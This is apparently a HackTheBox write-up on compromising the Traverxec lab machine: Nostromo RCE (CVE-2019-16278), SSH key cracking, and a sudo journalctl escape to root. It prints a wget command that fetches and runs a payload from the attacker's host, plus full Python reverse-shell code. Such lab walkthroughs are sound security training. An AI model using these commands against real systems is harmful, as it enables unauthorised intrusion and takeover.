
# Traverxec — HackTheBox Writeup

Traverxec is an easy difficulty machine from HackTheBox. It deals with enumeration and exploiting a webserver, Nostromo. Initial access is achieved by exploiting an RCE vulnerability on Nostromo. To obtain user access, we take advantage of read access on Nostromo configuration files. Privilege escalation to root requires abusing of sudo privilege on journalctl.

![Traverxec machine details](https://cdn-images-1.medium.com/max/2000/1*IFDP6IbcFLz4w8wvngRB1w.png)*Traverxec machine details*

### ***About Hack The Box Pen-testing Labs***
> # *Hack The Box is an online platform allowing you to test your penetration testing skills and exchange ideas and methodologies with thousands of people in the security field.*

## Reconnaissance

To get an idea of what ports are open, and the services running on the target box, I run [Nmap](https://tools.kali.org/information-gathering/nmap).

    **nmap -sC -sV -T4 -oN initial.nmap 10.10.10.165**

* **sC** : Default scripts

* **sV** : Service enumeration

* **T4** : Set timing template (higher is faster)

* **oN** : output in normal format to initial.nmap file

* **10.10.10.165** : Traverxec IP address

    **Nmap scan report for 10.10.10.165
    Host is up (0.15s latency).PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
    |   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
    |_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
    80/tcp open  http    nostromo 1.9.6
    |_http-server-header: nostromo 1.9.6
    |_http-title: TRAVERXEC
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel**

nmap shows two common ports open, SSH (TCP port 22) and HTTP (TCP port 80).

nmap also reveals service information on port 80 to be nostromo 1.9.6

### Manual visit — website

![](https://cdn-images-1.medium.com/max/3454/1*FJHK-IP0b16Tc952wkWDPw.png)

![](https://cdn-images-1.medium.com/max/3840/1*tWpglm_BS13-LnEhmFufYw.png)

Nothing interesting can be found on the webpage.

## Initial Shell as www-data user

### Identify vulnerability

The webserver is nostromo 1.9.6 . Confirming that with a simple cURL request.

![](https://cdn-images-1.medium.com/max/2000/1*9oiVgdkS_imTAS5giwTKNg.png)

Doing some research about nostromo 1.9.6 points to
[**CVE-2019-16278 - Unauthenticated Remote Code Execution in Nostromo web server**
*Hi, Welcome to my blog! In this post, I will analyze CVE-2019-16278, how to exploit and why it vulnerable. This CVE is…*www.sudokaikan.com](https://www.sudokaikan.com/2019/10/cve-2019-16278-unauthenticated-remote.html)

To get a deep understanding of the bug, please go through the above blog. In a nutshell, here’s the vulnerability info
> Nostromo fails to verify a URL that leads to [path traversal](https://www.owasp.org/index.php/Path_Traversal) to any file in the system. An unauthenticated attacker can force the server points to a shell file like /bin/sh and execute arbitrary commands.

### Exploiting Nostromo

[Exploit-DB](https://www.exploit-db.com/) has a PoC script written in python to exploit the Nostromo vulnerability.
[**Offensive Security's Exploit Database Archive**
*nostromo 1.9.6 - Remote Code Execution. CVE-2019-16278 . remote exploit for Multiple platform*www.exploit-db.com](https://www.exploit-db.com/exploits/47837)

![](https://cdn-images-1.medium.com/max/2000/1*nQRXlIv8-bSQTfz0olH8OA.png)

Exploit requires three parameters,*** Target IP, Target Port, Command.***

![](https://cdn-images-1.medium.com/max/2116/1*6-HyM9W6hYyOhKE_MdamBA.png)

The exploit worked successfully, and it returned traverxec as the hostname.

### Gaining Shell

I uploaded a python reverse shell script to the target box, and thus received a reverse shell, with the below command.

    **python 47837.py 10.10.10.165 80 "wget 10.10.14.164/pythonshell.py -O /tmp/kk.py; python /tmp/kk.py"**

Here are the contents of my python reverse shell script

    **root@kali:~/htb/boxes/traverxec# cat pythonshell.py 
    import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.31",1234));
    os.dup2(s.fileno(),0);
    os.dup2(s.fileno(),1);
    os.dup2(s.fileno(),2);
    p=subprocess.call(["/bin/sh","-i"]);**

![](https://cdn-images-1.medium.com/max/3566/1*lCFBp8fPvV-_1_BiGC-xuA.png)

## Privilege escalation www-data -> david

Enumerating the filesystem, there’s this directory which had nostromo configuration details.

![](https://cdn-images-1.medium.com/max/2000/1*48k-9Z6iVRFFsm3H9uo5Ow.png)

Here are the contents of the file nhttpd.conf

    www-data@traverxec:/var/nostromo/conf$ cat nhtt*
    cat nhtt*

    # MAIN [MANDATORY]
    servername              traverxec.htb
    serverlisten            *
    serveradmin             david@traverxec.htb
    serverroot              /var/nostromo
    servermimes             conf/mimes
    docroot                 /var/nostromo/htdocs
    docindex                index.html

    # LOGS [OPTIONAL]
    logpid                  logs/nhttpd.pid

    # SETUID [RECOMMENDED]
    user                    www-data

    # BASIC AUTHENTICATION [OPTIONAL]
    htaccess                .htaccess
    htpasswd                /var/nostromo/conf/.htpasswd

    # ALIASES [OPTIONAL]
    /icons                  /var/nostromo/icons

    # HOMEDIRS [OPTIONAL]
    homedirs                /home
    homedirs_public         public_www

Here are the details deduced from the configuration file, the server admin is david ( there’s a possibility he’s a potential user on the box ), htpasswd ( cracking this, might give us a lead and help further ), homedirs ( directory name *public_www*).

Looking at the [documentation for Nostromo](http://webcache.googleusercontent.com/search?q=cache:mWxM9bi5aK4J:www.nazgul.ch/dev/nostromo_man.html+&cd=1&hl=en&ct=clnk&gl=in), there’s interesting information about *homedirs.*
[**nazgul.ch**
*Tip: To quickly find your search term on this page, press Ctrl+F or ⌘-F (Mac) and use the find bar. NHTTPD(8) System…*webcache.googleusercontent.com](http://webcache.googleusercontent.com/search?q=cache:mWxM9bi5aK4J:www.nazgul.ch/dev/nostromo_man.html+&cd=1&hl=en&ct=clnk&gl=in)
> HOMEDIRS
> To serve the home directories of your users via HTTP, enable the homedirs option by defining the path in where the home directories are stored, normally **/home.**To access a users home directory enter a ~ in the URL followed by the home directory name like in this example:

 [http://www.nazgul.ch/~hacki/](http://www.nazgul.ch/~hacki/)
> The content of the home directory is handled exactly the same way as a directory in your document root.
> You can restrict the access within the home directories to a single subdirectory by defining it via the** homedirs_public** option.

The home directory is /home/david and the *homedirs_public *must point to **/home/david/public_www**

Visiting /home/david/public_www , a folder exists there and also has an interesting backup file. Transferring the file to my machine to enumerate what’s in that file.

![](https://cdn-images-1.medium.com/max/2000/1*E1h4pi_xH2aVhvkuFdydTQ.png)

![](https://cdn-images-1.medium.com/max/2916/1*GHFDPYPvRJEQg368rPXEng.png)

There are SSH keys in the backup file. Out of which the private key id_rsa is encrypted.

![](https://cdn-images-1.medium.com/max/2000/1*kczWF4owOp5KJWhZhDRYCw.png)

### Cracking SSH key

[ssh2john.py](https://github.com/truongkma/ctf-tools/blob/master/John/run/sshng2john.py) can be used to generate a hash, so that [John ](https://www.openwall.com/john/)can crack it. Command to generate a hash is given below,

![](https://cdn-images-1.medium.com/max/2432/1*D86vNrc4BgB-kiOnJAH2Og.png)

    **john hash --wordlist=/usr/share/wordlists/rockyou.txt**

![](https://cdn-images-1.medium.com/max/2586/1*42Hx400gDJ2b6hubuUUfRw.png)

## Shell as David

With the help of SSH key and passphrase, I logged into the machine, got the user flag.

![](https://cdn-images-1.medium.com/max/3206/1*2YKPypuI6938eORVEt3fnQ.png)

Enumerating david’s home directory, there’s an interesting bin directory and server-stats.sh file, which has usage of a sudo command.

    david@traverxec:~/bin$ cat server-stats.sh 
    #!/bin/bash

    cat /home/david/bin/server-stats.head
    echo "Load: `/usr/bin/uptime`"
    echo " "
    echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
    echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
    echo " "
    echo "Last 5 journal log lines:"
    /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 

Here’s the interesting line,

    /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat

## Privilege escalation david -> root

Since david has sudo privilege on journalctl command, I gained complete access as root by abusing this privilege.

Details on how to exploit sudo privilege can be found here,
[**journalctl | GTFOBins**
*This invokes the default pager, which is likely to be , other functions may apply. This might not work if run by…*gtfobins.github.io](https://gtfobins.github.io/gtfobins/journalctl/#sudo)

journalctl when run invokes a default pager-like less . The command on which david has sudo privilege has -n5 flag, which means only five lines of the output are shown. The terminal size should be reduced to a size so that it cannot accommodate 5 lines and it invokes less like environment.

Then typing !/bin/sh gives a root shell.

![](https://cdn-images-1.medium.com/max/2620/1*O91a2LS2fxLm1Vmj-eRl8A.png)

With this, complete root access to the system is gained.
